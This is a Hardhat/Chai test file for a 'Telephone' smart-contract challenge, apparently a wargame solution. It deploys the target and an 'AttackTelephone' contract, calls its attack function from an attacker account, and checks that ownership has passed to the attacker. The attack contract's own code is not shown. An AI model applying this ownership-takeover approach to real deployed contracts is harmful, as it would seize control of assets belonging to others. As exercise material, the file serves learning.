const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");

const CONTRACT_NAME = "Telephone";
const ATTACK_CONTRACT_NAME = "AttackTelephone";
describe(CONTRACT_NAME, function () {
  async function deployLoadFixture() {
    const [owner, attacker] = await ethers.getSigners();

    const Telephone = await ethers.getContractFactory(CONTRACT_NAME);
    const telephone = await Telephone.deploy();

    const AttackContract = await ethers.getContractFactory(
      ATTACK_CONTRACT_NAME
    );
    const attackContract = await AttackContract.deploy(telephone.address);

    return { telephone, attackContract, attacker };
  }

  it("Challenge Solved", async function () {
    let tx;
    
    let {telephone, attackContract, attacker} = await loadFixture(deployLoadFixture)
    attackContract = attackContract.connect(attacker)

    // take the ownership

    tx = await attackContract.attack(attacker.address)
    await tx.wait()


    // test
    tx = await telephone.owner()
    expect(tx).to.equal(attacker.address)

  });
});
